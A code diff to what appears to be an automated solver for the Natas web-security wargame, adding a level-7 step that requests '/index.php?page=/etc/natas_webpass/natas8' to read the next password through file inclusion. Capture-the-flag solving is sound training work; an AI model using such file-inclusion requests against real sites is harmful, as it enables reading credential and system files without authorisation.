@@ -64,7 +64,7 @@ while True:
             level = int(c[1])
         elif cmd == "next" or cmd == "n":
             if level > 34:
-                print("You reached maxium level")
+                print("You have reached the maximum level")
                 continue
             else:
                 level += 1
@@ -149,6 +149,21 @@ while True:
                     print(" Password found: {}".format(passwords[level + 1]))
                 else:
                     print(" Password not found")
+        elif level == 7:
+            u = "/index.php?page=/etc/natas_webpass/natas8"
+            print(" Get page {}".format(u))
+            res, reg = rex(
+                "GET",
+                u,
+                "<br>\n<br>\n(\w+)\n",
+            )
+            
+            if reg:
+                if len(passwords) == level + 1: passwords.append(reg[1])
+                print(" Password found: {}".format(passwords[level + 1]))
+            else:
+                print(" Password not found")
+
         else:
             print("Level must be between 1-34")
     else:
